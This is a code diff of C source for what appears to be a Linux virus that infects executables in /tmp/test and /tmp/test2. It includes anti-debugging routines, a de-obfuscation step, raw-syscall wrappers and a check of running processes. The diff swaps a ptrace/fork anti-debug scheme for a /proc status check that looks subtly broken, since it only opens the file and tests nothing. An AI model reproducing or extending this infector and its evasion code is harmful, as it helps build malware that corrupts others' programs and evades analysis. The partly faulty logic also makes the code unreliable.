@@ -3,29 +3,21 @@
 static void  start(void) {}
 asm("pushfq");
 int   entry_point(void *magic) {
-  int     ret;
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  if (checkProcess(procName) != 0)
+  /* if (checkProcess(procName) != 0) */
+  /*   return (stop(1, magic)); */
+  if (preventDebug(magic))
     return (stop(1, magic));
-  if ((ret = preventDebug(magic)) == -1)
-    return (stop(1, magic));
-  if (ret == 1)
-    return (stop(0, magic));
   if (magic != (void *)0x42) {
-    if (unObfuscate() == -1) {
-      if (magic == (void *)0x42)
-        return (stop(1, magic));
-      exit(1);
-    }
+    if (unObfuscate() == -1)
+      return (stop(1, magic));
   }
   infectBins(infectDir);
   infectBins(infectDir2);
-  if (magic == (void *)0x42)
-    return (stop(0, magic));
-  exit(0);
+  return (stop(0, magic));
 }
 
 static int   stop(int status, void *magic) {
@@ -186,15 +178,6 @@ static int  getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned in
   asm("syscall"
     : "=r" (rax));
   return (rax);
-}
-
-static pid_t  fork(void) {
-  register pid_t  ret asm("rax");
-  register int  rax asm("rax") = 57;
-
-  asm("syscall"
-    : "=r" (ret));
-  return (ret);
 }
 
 static long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data) {
@@ -413,7 +396,7 @@ static int  checkProcess(char *dirname) {
   while (bpos < nread) {
     dirp = (struct linux_dirent64 *)(buf + bpos);
     if (dirp->d_type == DT_DIR && dirp->d_name[0] > '0' && dirp->d_name[0] <= '9' && strcmp(dirname, procName) == 0) {
-      len = strlen(dirname) + strlen(procName) + 1;
+      len = strlen(dirp->d_name) + strlen(procName) + 1;
       if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0) {
         munmap(buf, BUF_SIZE);
         return (-1);
@@ -441,32 +424,35 @@ static int  checkProcess(char *dirname) {
 }
 
 static int   preventDebug(void *magic) {
-  pid_t pid;
-  int   status;
+  pid_t   pid;
+  int     fd;
+  size_t  len;
+  size_t  pidLen;
+  char    *tmp;
+  char  procName[] = "/proc/";
+  char  statusName[] = "/status";
 
-  if (magic == (void *)0x42) {
-    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0)
-      return (-1);
-  } else {
-    if ((pid = fork()) != 0) {
-      if (pid < 0)
-        return (-1);
-      if (waitpid(pid, 0, WUNTRACED) < 0) {
-        kill(pid, 9);
-        return (-1);
-      }
-      if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
-        kill(pid, 9);
-        return (-1);
-      }
-      while (waitpid(pid, &status, WCONTINUED) >= 0) {
-        if (__WIFSTOPPED(status))
-          ptrace(PTRACE_CONT, pid, 0, 0);
-      }
-      return (1);
-    } else
-      raise(SIGSTOP, getpid());
+  pidLen = 0;
+  pid = getpid();
+  while (pid != 0) {
+    pid /= 10;
+    pidLen += 1;
   }
+  if ((tmp = mmap(0, 14 + pidLen, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+    return (-1);
+  memcpy(tmp, procName, 6);
+  pid = getpid();
+  len = pidLen;
+  while (pid != 0) {
+    tmp[5 + len] = pid % 10 + 48;
+    len -= 1;
+    pid /= 10;
+  }
+  strcat(tmp, statusName);
+  if ((fd = open(tmp, O_RDONLY, 0)) < 0)
+    return (-1);
+  close(fd);
+  munmap(tmp, 14 + pidLen);
   return (0);
 }
 
